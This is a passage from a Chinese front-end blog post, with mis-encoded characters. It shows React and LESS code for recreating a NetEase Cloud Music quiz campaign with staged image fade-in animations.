<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¥é”€æ´»åŠ¨ä»â€œèƒ½è·‘â€åˆ°â€œä¸æ»‘â€çš„è¿›åŒ–]]></title>    <link>https://juejin.cn/post/7596906473306046514</link>    <guid>https://juejin.cn/post/7596906473306046514</guid>    <pubDate>2026-01-19T10:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473306046514" data-draft-id="7595466990111572008" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¥é”€æ´»åŠ¨ä»â€œèƒ½è·‘â€åˆ°â€œä¸æ»‘â€çš„è¿›åŒ–"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-19T10:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mh"/> <meta itemprop="url" content="https://juejin.cn/user/712139267641950"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¥é”€æ´»åŠ¨ä»â€œèƒ½è·‘â€åˆ°â€œä¸æ»‘â€çš„è¿›åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139267641950/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mh
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T10:51:51.000Z" title="Mon Jan 19 2026 10:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨æ—¥å¸¸çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦å¤åˆ»æŸäº›ç»å…¸çš„éœ€æ±‚â€”â€”â€”â€” æ—¢è¦é«˜åº¦è¿˜åŸä¼˜è´¨çš„äº¤äº’ä½“éªŒï¼Œåˆè¦é€‚é…ä¸åŒçš„ä¸šåŠ¡åœºæ™¯ã€‚æ¯”å¦‚ï¼šæœ€è¿‘å…¬å¸è®©æˆ‘åšä¸€ä¸ªå¾·å›½å†¬å­£å£å‘³è¥é”€æ´»åŠ¨ï¼Œå…·ä½“çš„äº¤äº’å‚è€ƒç½‘æ˜“äº‘ä¸ƒå¤•è¥é”€æ´»åŠ¨ï¼Œç”±äºå…¬å¸çš„ä»£ç æ˜¯nuxtå®ç°çš„å¹¶æ”¯æŒå¤–ç½‘è®¿é—®ï¼Œæ‰€æœ‰æˆ‘æ‰“ç®—ç”¨reacté‡æ–°å¤ç°ä¸€ä¸‹è¿™ä¸ªæ´»åŠ¨ï¼ˆç´ æä½¿ç”¨ç½‘æ˜“äº‘çš„ä¸ƒå¤•æ´»åŠ¨ä¸­çš„ç´ æï¼‰ã€‚æœ¬æ–‡å°†ä»æŠ€æœ¯è§’åº¦æ‹†è§£å¤åˆ»è¿‡ç¨‹ä¸­çš„æ ¸å¿ƒæ€è·¯å’Œè¸©å‘ç»éªŒã€‚</p>
<h2 data-id="heading-1">ç½‘æ˜“äº‘ä¸ƒå¤•æ´»åŠ¨é¡µé¢</h2>
<p>è¿™é‡Œæ˜¯ç½‘æ˜“äº‘ä¸ƒå¤•æ´»åŠ¨é¡µé¢åŸåœ°å€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fy.music.163.com%2Fg%2Fyida%2F2024love%2FC_g607j64ar2%3Fapp_version%3D9.4.05%26dlt%3D0846%26userid%3D1810128822%26page%3D1ba8b6833ac04d0890e9d5baefca24b4" target="_blank" title="https://y.music.163.com/g/yida/2024love/C_g607j64ar2?app_version=9.4.05&amp;dlt=0846&amp;userid=1810128822&amp;page=1ba8b6833ac04d0890e9d5baefca24b4" ref="nofollow noopener noreferrer">ç½‘æ˜“äº‘ä¸ƒå¤•æ´»åŠ¨</a> ä¾›å¤§å®¶è¿›è¡Œå‚è€ƒï¼Œæœ¬æ¬¡ä¸»è¦èšç„¦çš„æ˜¯<strong>é—®ç­”æ´»åŠ¨æ¨¡å—</strong>çš„å†…å®¹ï¼Œå¯¹äºç»“æœé¡µé¢æš‚ä¸è¿›è¡Œå¼€å‘ï¼Œå¦‚æœ‰ä¾µæƒå’Œå†’çŠ¯ä¹‹å¤„ï¼Œæ•¬è¯·è°…è§£ã€‚</p>
<h2 data-id="heading-2">æŠ€æœ¯æ‹†è§£</h2>
<p>åœ¨æ•´ä¸ªå¤åˆ»ä¸ƒå¤•æ´»åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œæœ€æ ¸å¿ƒçš„éš¾ç‚¹åœ¨äºï¼š<strong>å¦‚ä½•å¤§é‡é«˜æ¸…å›¾ç‰‡åˆ‡æ¢çš„è¿‡ç¨‹ä¸­ï¼Œä¿æŒåŠ¨ç”»çš„è¿è´¯æ€§ä¸”ä¸ä¼šå¡é¡¿ï¼Ÿ</strong></p>
<h2 data-id="heading-3">åˆç‰ˆ</h2>
<p><strong>å®šä½ï¼šå¿«é€Ÿå®ç°åŠŸèƒ½åŸå‹ï¼Œä½†å­˜åœ¨æ˜æ˜¾çš„æ€§èƒ½å’Œä½“éªŒç“¶é¢ˆã€‚</strong></p>
<p>æ ¸å¿ƒä»£ç å±•ç¤º</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBeginTesting</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAnsweringQuestion</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a + <span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"first-edition-container"</span>&gt;</span>
      {questionList.map((item, index) =&gt; {
        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">step-content</span> <span class="hljs-attr">step</span>${<span class="hljs-attr">index</span>} ${<span class="hljs-attr">currentStep</span> !== <span class="hljs-string">index</span> ? '<span class="hljs-attr">fade-item</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">fade-enter-done</span>'}`}
            <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span>
            {index === 0 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleBeginTesting}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            )}
            {!!item.question1 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
                <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
                <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
              /&gt;</span>
            )}
            {!!item.question2 &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
                <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
                <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
              /&gt;</span>
            )}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        );
      })}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// åŠ¨ç”»éƒ¨åˆ†</span>
<span class="hljs-selector-class">.first-edition-container</span> <span class="hljs-selector-class">.fade-item</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  -webkit-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -o-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -moz-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
}

<span class="hljs-selector-class">.first-edition-container</span> <span class="hljs-selector-class">.fade-enter-done</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;
  -webkit-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -o-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  -moz-<span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">1s</span> ease-in-out;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}
</code></pre>
<h4 data-id="heading-4">ä»¥ä¸‹æ˜¯åˆç‰ˆçš„è¯¦ç»†ä»£ç åˆ†æï¼š</h4>
<p><strong>1. æ ¸å¿ƒé€»è¾‘</strong></p>
<ul>
<li>
<p>å…¨é‡æŒ‚è½½ï¼šé€šè¿‡ questionList.map ä¸€æ¬¡æ€§å°†æ‰€æœ‰é¢˜ç›®æ¸²æŸ“åˆ° DOM æ ‘ä¸­ã€‚</p>
</li>
<li>
<p>çŠ¶æ€åˆ‡æ¢ï¼šä»…ä¾é ä¸€ä¸ª currentStep å˜é‡ï¼Œé…åˆ CSS ç±»åï¼ˆfade-item vs fade-enter-doneï¼‰æ¥æ§åˆ¶é¢˜ç›®çš„æ˜¾ç¤ºä¸éšè—ã€‚</p>
</li>
<li>
<p>é€»è¾‘ç®€å•ï¼šå‡½æ•°ç»„ä»¶å†…éƒ¨åªæœ‰æœ€åŸºç¡€çš„ useStateï¼Œæ²¡æœ‰å¤æ‚çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†</p>
</li>
</ul>
<p><strong>2. ç¼ºé™·</strong></p>
<ul>
<li>
<p>é¦–å±æ¸²æŸ“å‹åŠ›è¾ƒå¤§ï¼š ç”±äºé‡‡ç”¨å…¨é‡æ¸²æŸ“æ¨¡å¼ï¼Œç½‘ç«™ä¸€æ‰“å¼€åŠ è½½æ‰€æœ‰çš„å›¾ç‰‡èµ„æºï¼Œåœ¨å¼±ç½‘çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯¼è‡´é¦–å±åŠ è½½æ—¶é—´è¿‡é•¿ï¼Œç™½å±ç­‰æƒ…å†µã€‚</p>
</li>
<li>
<p>ç¼ºä¹åŠ¨ç”»çš„ç²¾ç»†åº¦ï¼šä»£ç ä¸­ä»…é€šè¿‡ç®€å•çš„ç±»åå»æ§åˆ¶ opacity çš„å˜åŒ–ï¼Œåœ¨ç½‘æ˜“äº‘çš„åŸç‰ˆäº¤äº’ä¸­ï¼ŒèƒŒæ™¯å›¾ã€é—®é¢˜1ã€é—®é¢˜2æ˜¯ç”±å…ˆåé¡ºåºçš„é˜¶æ¢¯å¼æ·¡å…¥ã€‚</p>
</li>
</ul>
<h3 data-id="heading-5">åˆç‰ˆ--æ•ˆæœå±•ç¤º</h3>
<p><span href="https://code.juejin.cn/pen/7595789985958068250" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7595789985958068250" data-src="https://code.juejin.cn/pen/7595789985958068250" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-6">è¿›é˜¶ç‰ˆ</h2>
<p>å®šä½ï¼š<strong>ä»â€œç®€å•çš„ UI åˆ‡æ¢â€è½¬å‘äº†â€œç²¾ç»†åŒ–äº¤äº’æ§åˆ¶â€</strong>ã€‚</p>
<p>æ ¸å¿ƒä»£ç å±•ç¤º</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">StepItem</span> = (<span class="hljs-params">{ item, index, isActive, onBegin, onAnswer }</span>) =&gt; {
  <span class="hljs-comment">// åŠ¨ç”»çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [imageOpacity, setImageOpacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> [question1Opacity, setQuestion1Opacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> [question2Opacity, setQuestion2Opacity] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-comment">// å›¾ç‰‡åŠ è½½å®Œæˆæ ‡å¿—</span>
  <span class="hljs-keyword">const</span> [imageLoaded, setImageLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// åŠ¨ç”»å®Œæˆæ ‡å¿—</span>
  <span class="hljs-keyword">const</span> imageAnimationDone = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> question1AnimationDone = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// å½“ç»„ä»¶å˜ä¸ºæ¿€æ´»çŠ¶æ€æ—¶å¼€å§‹åŠ¨ç”»</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (isActive) {
      <span class="hljs-comment">// é‡ç½®åŠ¨ç”»çŠ¶æ€</span>
      <span class="hljs-title function_">setImageOpacity</span>(<span class="hljs-number">0</span>);
      <span class="hljs-title function_">setQuestion1Opacity</span>(<span class="hljs-number">0</span>);
      <span class="hljs-title function_">setQuestion2Opacity</span>(<span class="hljs-number">0</span>);
      imageAnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">false</span>;
      question1AnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">false</span>;
    }
  }, [isActive]);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> question1Timer = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> question2Timer = <span class="hljs-literal">null</span>;

    <span class="hljs-comment">// å¦‚æœçŠ¶æ€æœªæ¿€æ´»æˆ–è€…å›¾ç‰‡æ²¡æœ‰åŠ è½½å®Œæˆç›´æ¥ç»ˆæ­¢</span>
    <span class="hljs-keyword">if</span> (!isActive || !imageLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runImageAnimation</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-title function_">setImageOpacity</span>(<span class="hljs-number">1</span>);
      imageAnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runQuestion1Animation</span> = (<span class="hljs-params"/>) =&gt; {
      question1Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">question1</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// æ— question1 â†’ ç»ˆæ­¢</span>
        <span class="hljs-title function_">setQuestion1Opacity</span>(<span class="hljs-number">1</span>);
        question1AnimationDone.<span class="hljs-property">current</span> = <span class="hljs-literal">true</span>;
        <span class="hljs-title function_">runQuestion2Animation</span>(); <span class="hljs-comment">// æ‰§è¡Œå®Œquestion1ï¼Œå†æ‰§è¡Œquestion2</span>
      }, <span class="hljs-number">500</span>);
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">runQuestion2Animation</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!item.<span class="hljs-property">question2</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// æ— question2 â†’ ç»ˆæ­¢</span>
      question2Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setQuestion2Opacity</span>(<span class="hljs-number">1</span>);
      }, <span class="hljs-number">500</span>);
    };

    <span class="hljs-comment">// æ‰§è¡Œå›¾ç‰‡åŠ¨ç”»</span>
    <span class="hljs-title function_">runImageAnimation</span>();
    <span class="hljs-comment">// æ‰§è¡Œé—®é¢˜1åŠ¨ç”»</span>
    <span class="hljs-title function_">runQuestion1Animation</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-built_in">clearTimeout</span>(question1Timer);
      <span class="hljs-built_in">clearTimeout</span>(question2Timer);
    };
  }, [isActive, imageLoaded, item.<span class="hljs-property">question1</span>, item.<span class="hljs-property">question2</span>]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
      <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">step-content</span> <span class="hljs-attr">step</span>${<span class="hljs-attr">index</span>} ${<span class="hljs-attr">isActive</span> ? '<span class="hljs-attr">fade-enter-done</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">fade-item</span>'}`}
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
        <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">imageOpacity</span> }}
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{()</span> =&gt;</span> setImageLoaded(true)}
      /&gt;
      {index === 0 &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBegin}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}
      {!!item.question1 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">question1Opacity</span> }}
        /&gt;</span>
      )}
      {!!item.question2 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">question2Opacity</span> }}
        /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBeginTesting</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAnsweringQuestion</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">a</span> =&gt;</span> a + <span class="hljs-number">1</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"second-edition-container"</span>&gt;</span>
      {questionList.map((item, index) =&gt; {
        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">StepItem</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
            <span class="hljs-attr">item</span>=<span class="hljs-string">{item}</span>
            <span class="hljs-attr">index</span>=<span class="hljs-string">{index}</span>
            <span class="hljs-attr">isActive</span>=<span class="hljs-string">{currentStep</span> === <span class="hljs-string">index}</span>
            <span class="hljs-attr">onBegin</span>=<span class="hljs-string">{handleBeginTesting}</span>
            <span class="hljs-attr">onAnswer</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
          /&gt;</span>
        );
      })}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// åŠ¨ç”»éƒ¨åˆ†</span>
<span class="hljs-selector-class">.second-edition-container</span> <span class="hljs-selector-class">.fade-item</span> {
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
}

<span class="hljs-selector-class">.second-edition-container</span> <span class="hljs-selector-class">.fade-enter-done</span> {
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}
</code></pre>
<h4 data-id="heading-7">ä»¥ä¸‹æ˜¯è¿›é˜¶ç‰ˆçš„è¯¦ç»†ä»£ç åˆ†æï¼š</h4>
<p><strong>1. æ ¸å¿ƒæ”¹è¿›ï¼šæ—¶åºæ§åˆ¶åŠ¨ç”»</strong></p>
<ul>
<li>é€šè¿‡ setTimeout é“¾å¼è°ƒç”¨ï¼Œæ¨¡æ‹Ÿäº†ç½‘æ˜“äº‘åŸç‰ˆä¸­ç´ æé”™è½æœ‰è‡´çš„å…¥åœºæ•ˆæœã€‚</li>
</ul>
<p><strong>2. å¼•å…¥å›¾ç‰‡åŠ è½½ç›‘æµ‹</strong></p>
<ul>
